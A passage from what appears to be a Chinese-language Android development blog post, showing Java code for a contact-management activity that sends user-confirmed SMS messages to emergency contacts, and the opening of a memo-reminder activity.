Toast.makeText(SendActivity.this, &quot;所有短信发送成功~&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">                catch (Exception e) &#123;</div><div class="line">                    Toast.makeText(SendActivity.this, &quot;没有找到符合条件的联系人!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private boolean checkInfo(String s)</div><div class="line">    &#123;</div><div class="line">        if(s.equals(&quot;&quot;)||s==null)</div><div class="line">            return false;</div><div class="line">        else</div><div class="line">            return true;</div><div class="line">    &#125;</div><div class="line">    public void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.send_msg);</div><div class="line">        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)</div><div class="line">                != PackageManager.PERMISSION_GRANTED) &#123;</div><div class="line">            ActivityCompat.requestPermissions(this, new String[]&#123;Manifest.permission.SEND_SMS&#125;, 1);</div><div class="line">        &#125;</div><div class="line">        db=new mem_DBServer(this);</div><div class="line">        mem_id = (EditText) this.findViewById(R.id.mem_id);</div><div class="line">        name = (EditText) this.findViewById(R.id.name);</div><div class="line">        search_msg = (EditText) this.findViewById(R.id.search_msg);</div><div class="line">        phone_num = (EditText) this.findViewById(R.id.phone_num);</div><div class="line">        send_info=(EditText)this.findViewById(R.id.send_info);</div><div class="line">        send_button=(Button) this.findViewById(R.id.send_button);</div><div class="line">//        txt_content = (EditText) this.findViewById(R.id.txt_content);</div><div class="line">//        btn_send = (Button) this.findViewById(R.id.btn_send);</div><div class="line">        get_mem = (Button) this.findViewById(R.id.get_mem);</div><div class="line">        display_mem = (TextView) this.findViewById(R.id.display_mem);</div><div class="line">        get_all_mem = (Button) this.findViewById(R.id.get_all_mem);</div><div class="line">        add_mem=(Button) this.findViewById(R.id.add_mem);</div><div class="line">        del_mem = (Button) this.findViewById(R.id.del_mem);</div><div class="line">        mod_mem = (Button) this.findViewById(R.id.mod_mem);</div><div class="line">        phone_type_Spin=(Spinner)this.findViewById(R.id.phone_type);</div><div class="line">        set_or_not_Spin=(Spinner)this.findViewById(R.id.set_or_not);</div><div class="line">        search_type_Spin=(Spinner)this.findViewById(R.id.search_type);</div><div class="line">        phone_type_Adapter = new ArrayAdapter&lt;String&gt;(SendActivity.this,</div><div class="line">                android.R.layout.simple_spinner_item,phone_type_items);</div><div class="line">        set_or_not_Adapter = new ArrayAdapter&lt;String&gt;(SendActivity.this,</div><div class="line">                android.R.layout.simple_spinner_item,set_or_not_items);</div><div class="line">       search_type_Adapter = new ArrayAdapter&lt;String&gt;(SendActivity.this,</div><div class="line">                android.R.layout.simple_spinner_item,search_type_items);</div><div class="line">        set_or_not_Spin.setAdapter(set_or_not_Adapter);</div><div class="line">        phone_type_Spin.setAdapter(phone_type_Adapter);</div><div class="line">        search_type_Spin.setAdapter(search_type_Adapter);</div><div class="line">        search_type_Spin.setSelection(0,true);</div><div class="line">        phone_type_Spin.setSelection(0,true);</div><div class="line">        set_or_not_Spin.setSelection(0,true);</div><div class="line">        set_or_not_Spin.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener()</div><div class="line">        &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int position, long arg3)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">               set_or_not_Pos= position;</div><div class="line">            &#125;</div><div class="line">            @Override</div><div class="line">            public void onNothingSelected(AdapterView&lt;?&gt; arg0)</div><div class="line">            &#123;</div><div class="line">                set_or_not_Pos=0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        phone_type_Spin.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener()</div><div class="line">        &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int position, long arg3)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">                phone_type_Pos= position;</div><div class="line">            &#125;</div><div class="line">            @Override</div><div class="line">            public void onNothingSelected(AdapterView&lt;?&gt; arg0)</div><div class="line">            &#123;</div><div class="line">                phone_type_Pos=0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        search_type_Spin.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener()</div><div class="line">        &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int position, long arg3)</div><div class="line">            &#123;</div><div class="line">//                private String[]search_type_items=new String[]&#123;&quot;编号&quot;,&quot;是否设置&quot;,&quot;姓名&quot;,&quot;号码&quot;,&quot;方式&quot;&#125;;</div><div class="line">                search_type_Pos= position;</div><div class="line">                if(position==0) search_msg.setText(&quot;1&quot;);</div><div class="line">                else if(position==1) search_msg.setText(&quot;是&quot;);</div><div class="line">                else if(position==2) search_msg.setText(&quot;&quot;);</div><div class="line">                else if(position==3) search_msg.setText(&quot;&quot;);</div><div class="line">                else if(position==4) search_msg.setText(&quot;手机&quot;);</div><div class="line">            &#125;</div><div class="line">            @Override</div><div class="line">            public void onNothingSelected(AdapterView&lt;?&gt; arg0)</div><div class="line">            &#123;</div><div class="line">                search_type_Pos=0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        add_mem.setOnClickListener(new OnClickListener() &#123;</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">                mem t=new mem();</div><div class="line">                String temp_name=name.getText().toString();</div><div class="line">                String temp_phone_num=phone_num.getText().toString();</div><div class="line">                if(checkInfo(temp_name)&amp;&amp;checkInfo(temp_phone_num)) &#123;</div><div class="line">                   windows(1);</div><div class="line">                &#125;</div><div class="line">                else&#123;</div><div class="line">                    Toast.makeText(SendActivity.this, &quot;联系人信息填写不完整，无法添加&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">                &#125;</div><div class="line">        &#125;);</div><div class="line">        del_mem.setOnClickListener(new OnClickListener() &#123;</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">             windows(2);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        get_mem.setOnClickListener(new OnClickListener() &#123;</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">//                private String[]search_type_items=new String[]&#123;&quot;编号&quot;,&quot;是否设置&quot;,&quot;姓名&quot;,&quot;号码&quot;,&quot;方式&quot;&#125;;</div><div class="line">               String search_info=search_msg.getText().toString();</div><div class="line">                mem t=new mem();</div><div class="line">                List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">                    try&#123;</div><div class="line">                        display_mem.setText(&quot;&quot;);</div><div class="line">                        if(search_type_Pos==0) &#123;</div><div class="line">                            int i = Integer.parseInt(search_info);</div><div class="line">                            t = db.FindMemById(i);</div><div class="line">                            display_mem.setText(t.toString());</div><div class="line">                        &#125;</div><div class="line">                        else if(search_type_Pos==1)&#123;</div><div class="line">                            String data=&quot;&quot;;</div><div class="line">                            arr=db.FindMemBySet_or_not(search_info);</div><div class="line">                            for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                                data+=&quot;\n&quot;+arr.get(i).toString();</div><div class="line">                            &#125;</div><div class="line">                            display_mem.setText(data);</div><div class="line">                        &#125;</div><div class="line">                        else if(search_type_Pos==2)&#123;</div><div class="line">                            String data=&quot;&quot;;</div><div class="line">                            arr=db.FindMemByName(search_info);</div><div class="line">                            for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                                data+=&quot;\n&quot;+arr.get(i).toString();</div><div class="line">                            &#125;</div><div class="line">                            display_mem.setText(data);</div><div class="line">                        &#125;</div><div class="line">                        else if(search_type_Pos==3)&#123;</div><div class="line">                            String data=&quot;&quot;;</div><div class="line">                            arr=db.FindMemByPhone_num(search_info);</div><div class="line">                            for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                                data+=&quot;\n&quot;+arr.get(i).toString();</div><div class="line">                            &#125;</div><div class="line">                            display_mem.setText(data);</div><div class="line">                        &#125;</div><div class="line">                        else if(search_type_Pos==4)&#123;</div><div class="line">                            String data=&quot;&quot;;</div><div class="line">                            arr=db.FindMemByPhone_type(search_info);</div><div class="line">                            for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                                data+=&quot;\n&quot;+arr.get(i).toString();</div><div class="line">                            &#125;</div><div class="line">                            display_mem.setText(data);</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    catch (Exception e) &#123;</div><div class="line">                        Toast.makeText(SendActivity.this, &quot;没有找到符合条件的联系人!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                    &#125;</div><div class="line">                Toast.makeText(SendActivity.this, &quot;成功查找联系人!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        mod_mem.setOnClickListener(new OnClickListener() &#123;</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">                String temp_name=name.getText().toString();</div><div class="line">                String temp_phone_num=phone_num.getText().toString();</div><div class="line">                String temp_mem_id=mem_id.getText().toString();</div><div class="line">                if(checkInfo(temp_mem_id)&amp;&amp;checkInfo(temp_name)&amp;&amp;checkInfo(temp_phone_num))&#123;</div><div class="line">                    windows(3);</div><div class="line">                &#125;</div><div class="line">                else&#123;</div><div class="line">                    Toast.makeText(SendActivity.this, &quot;联系人信息填写不完整，无法修改&quot;, Toast.LENGTH_LONG).show();//提示成功</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        send_button.setOnClickListener(new OnClickListener() &#123;</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">                String infos=send_info.getText().toString();</div><div class="line">                String search_info=search_msg.getText().toString();</div><div class="line">                if(checkInfo(infos)&amp;&amp;checkInfo(search_info))&#123;</div><div class="line">                    windows(4);</div><div class="line">                &#125;</div><div class="line">                else&#123;</div><div class="line">                    Toast.makeText(SendActivity.this, &quot;联系人信息不完整，无法发送短信！&quot;, Toast.LENGTH_LONG).show();//提示成功</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        get_all_mem.setOnClickListener(new OnClickListener() &#123;</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">                List&lt;mem&gt; arr=new ArrayList&lt;mem&gt;();</div><div class="line">                arr=db.get_all_mem();</div><div class="line">                String data=&quot;&quot;;</div><div class="line">                for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                    data+=&quot;\n&quot;+arr.get(i).toString();</div><div class="line">                &#125;</div><div class="line">                display_mem.setText(data);</div><div class="line">                Toast.makeText(SendActivity.this, &quot;成功显示所有联系人信息!&quot;, Toast.LENGTH_LONG).show();//提示成功</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    private  void init()&#123;</div><div class="line">        mem_id.setText(&quot;&quot;);</div><div class="line">        phone_type_Spin.setSelection(0,true);</div><div class="line">        set_or_not_Spin.setSelection(0,true);</div><div class="line">        name.setText(&quot;&quot;);</div><div class="line">        phone_num.setText(&quot;&quot;);</div><div class="line">        search_type_Spin.setSelection(0,true);</div><div class="line">        search_msg.setText(&quot;&quot;);</div><div class="line">    &#125;</div><div class="line">    protected void sendSMSMessage(String phoneNo,String message) &#123;</div><div class="line">        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)</div><div class="line">                != PackageManager.PERMISSION_GRANTED) &#123;</div><div class="line">            ActivityCompat.requestPermissions(this, new String[]&#123;Manifest.permission.SEND_SMS&#125;, 1);//自定义的code</div><div class="line">        &#125;</div><div class="line">        if(phoneNo.equals(&quot;&quot;))</div><div class="line">            phoneNo = set_num;</div><div class="line">        if(message.equals(&quot;&quot;))</div><div class="line">            message = &quot;您已被设置为此号码的紧急联系人,若有疑问可以回复此短信。&quot;;</div><div class="line"></div><div class="line">        try &#123;</div><div class="line">            SmsManager smsManager = SmsManager.getDefault();</div><div class="line">            ArrayList&lt;String&gt; texts = smsManager.divideMessage(message);</div><div class="line">            for (String text : texts) &#123;</div><div class="line">                smsManager.sendTextMessage(phoneNo, null, text, null, null);//分别发送每一条短信</div><div class="line">            &#125;</div><div class="line">            Toast.makeText(getApplicationContext(), &quot;紧急联系人确认短信已经发送出去&quot;,</div><div class="line">                    Toast.LENGTH_LONG).show();</div><div class="line">        &#125; catch (Exception e) &#123;</div><div class="line">            Toast.makeText(getApplicationContext(),</div><div class="line">                    &quot;确认短信发送失败.&quot;,</div><div class="line">                    Toast.LENGTH_LONG).show();</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    public void windows(int x)&#123;</div><div class="line">        if (x==1) &#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定添加该联系人吗？（若设置为紧急联系人将会发送确认信息）&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认添加&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            add_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            add_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">        else if(x==2)&#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定删除该联系人吗？(一旦删除不可恢复)&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认删除&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            del_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            del_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">        else if(x==3)&#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定修改该联系人信息吗？(一旦修改不可恢复)&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认修改&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            mod_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            mod_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">        else  if(x==4)&#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定发送短信给指定联系人吗？(一旦发送无法撤回)&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认发送&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            send_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            send_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="2-3-备忘录的增删改查-包括界面友好的提示-√"><a href="#2-3-备忘录的增删改查-包括界面友好的提示-√" class="headerlink" title="2-3 备忘录的增删改查(包括界面友好的提示)√"></a>2-3 备忘录的增删改查(包括界面友好的提示)√</h2><p>通过ID号获取<br><img src="http://op72m4y17.bkt.clouddn.com/app42.png" alt=""><br>删除备忘录<br><img src="http://op72m4y17.bkt.clouddn.com/app43.png" alt=""></p>
<p>已成功删除<br><img src="http://op72m4y17.bkt.clouddn.com/app44.png" alt=""><br>添加备忘录<br><img src="http://op72m4y17.bkt.clouddn.com/app45.png" alt=""><br>设置时间提醒<br><img src="http://op72m4y17.bkt.clouddn.com/app46.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div><div class="line">517</div><div class="line">518</div><div class="line">519</div><div class="line">520</div><div class="line">521</div><div class="line">522</div><div class="line">523</div><div class="line">524</div><div class="line">525</div><div class="line">526</div><div class="line">527</div><div class="line">528</div><div class="line">529</div><div class="line">530</div><div class="line">531</div><div class="line">532</div><div class="line">533</div><div class="line">534</div><div class="line">535</div><div class="line">536</div><div class="line">537</div><div class="line">538</div><div class="line">539</div><div class="line">540</div><div class="line">541</div><div class="line">542</div><div class="line">543</div><div class="line">544</div><div class="line">545</div><div class="line">546</div><div class="line">547</div><div class="line">548</div><div class="line">549</div><div class="line">550</div><div class="line">551</div><div class="line">552</div><div class="line">553</div></pre></td><td class="code"><pre><div class="line">BWL.java</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">import java.util.ArrayList;</div><div class="line">import java.util.Calendar;</div><div class="line">import java.util.List;</div><div class="line"></div><div class="line">import android.app.Activity;</div><div class="line">import android.app.AlarmManager;</div><div class="line">import android.app.AlertDialog;</div><div class="line">import android.app.PendingIntent;</div><div class="line">import android.app.TimePickerDialog;</div><div class="line">import android.content.DialogInterface;</div><div class="line">import android.content.Intent;</div><div class="line">import android.content.SharedPreferences;</div><div class="line">import android.graphics.Color;</div><div class="line">import android.os.Bundle;</div><div class="line">import android.os.Handler;</div><div class="line">import android.os.Message;</div><div class="line">import android.view.View;</div><div class="line">import android.widget.AdapterView;</div><div class="line">import android.widget.ArrayAdapter;</div><div class="line">import android.widget.Button;</div><div class="line">import android.widget.EditText;</div><div class="line">import android.widget.Spinner;</div><div class="line">import android.widget.TextView;</div><div class="line">import android.widget.TimePicker;</div><div class="line">import android.widget.Toast;</div><div class="line"></div><div class="line">import com.hitomi.cmlibrary.CircleMenu;</div><div class="line">import com.hitomi.cmlibrary.OnMenuSelectedListener;</div><div class="line">import com.hitomi.cmlibrary.OnMenuStatusChangeListener;</div><div class="line"></div><div class="line">public class BWL extends Activity &#123;</div><div class="line">    private CircleMenu circleMenu;</div><div class="line">    private TextView tv = null,bwl_db=null;</div><div class="line">    private Button setTime,cancelTime,display_bwl,add_item,del_item,get_item;</div><div class="line">    private EditText info,info_id,time;</div><div class="line">    private Spinner importance_Spinner,type_Spinner,rem_time_Spinner;</div><div class="line">    private  ArrayAdapter&lt;String&gt; importance_Adapter = null,type_Adapter=null,rem_time_Adapter=null;</div><div class="line">    